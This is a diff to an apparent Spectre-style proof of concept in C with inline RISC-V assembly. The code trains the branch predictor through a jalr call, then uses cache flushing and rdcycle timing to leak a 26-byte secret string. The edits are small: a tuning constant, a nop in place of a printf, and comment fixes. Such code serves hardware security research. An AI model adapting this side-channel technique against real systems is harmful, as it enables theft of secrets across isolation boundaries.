@@ -5,7 +5,7 @@
 
 #define TRAIN_TIMES 6 // assumption is that you have a 2 bit counter in the predictor
 #define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
-#define ATTACK_SAME_ROUNDS 20 // amount of times to attack the same index
+#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
 #define SECRET_SZ 26
 #define CACHE_HIT_THRESHOLD 50
 
@@ -49,7 +49,7 @@ void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, ui
  * the victimFunc should run speculatively (it is the gadget) then the wantFunc should run
  */
 void wantFunc(){
-    printf("This is what should run!\n");
+    asm("nop");
 }
 
 /**
@@ -70,7 +70,6 @@ int main(void){
     uint64_t passInIdx, randIdx;
     uint8_t dummy = 0;
     static uint64_t results[256];
-    //printf("Array1 at (0x%p), Secret at (0x%p), Subtraction (%d)\n", array1, secretString, wantAddr);
 
     // try to read out the secret
     for(uint64_t len = 0; len < SECRET_SZ; ++len){
@@ -87,26 +86,25 @@ int main(void){
             flushCache((uint64_t)array2, sizeof(array2));
 
             for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
-                // bit twiddling to set passInAddr=TRAIN_IDX or to wantAddr after TRAIN_TIMES iterations
+                // bit twiddling to set (passInAddr, passInIdx)=(victimAddr, randIdx) or (wantAddr, attackIdx) after TRAIN_TIMES iterations
                 // avoid jumps in case those tip off the branch predictor
-                // note: victimAddr changes everytime the atkRound changes so that the tally does not get affected
+                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                 //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                 passInAddr = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInAddr=...FFFF0000 else 0
                 passInAddr = (passInAddr | (passInAddr >> 16)); // set the passInAddr=-1 or 0
-                passInAddr = victimAddr ^ (passInAddr & (wantAddr ^ victimAddr)); // select TRAIN_IDX or wantAddr 
+                passInAddr = victimAddr ^ (passInAddr & (wantAddr ^ victimAddr)); // select victimAddr or wantAddr 
 
                 randIdx = atkRound % array1_sz;
                 passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                 passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
-                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select TRAIN_IDX or attackIdx 
-
+                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
 
                 // set of constant takens to make the BHR be in a all taken state
                 for(uint64_t k = 0; k < 30; ++k){
                     asm("");
                 }
 
-                // this calls the function using jalr
+                // this calls the function using jalr and delays the addr passed in through fdiv
                 asm("addi %[addr], %[addr], -2\n"
                     "addi t1, zero, 2\n"
                     "slli t2, t1, 0x4\n"
@@ -120,7 +118,7 @@ int main(void){
                     "add %[addr], %[addr], t2\n"
                     "mv a0, %[arg]\n"
                     "jalr ra, %[addr], 0\n"
-                    ://: [addr] "=r" (passInAddr)
+                    :
                     : [addr] "r" (passInAddr), [arg] "r" (passInIdx)
                     : "t1", "t2", "fa4", "fa5");
             }
@@ -133,7 +131,6 @@ int main(void){
                 diff = (rdcycle() - start);
                 if ( diff < CACHE_HIT_THRESHOLD ){
                     results[i] += 1;
-                    //printf("hit idx(%lu)\n", i);
                 }
             }
         }
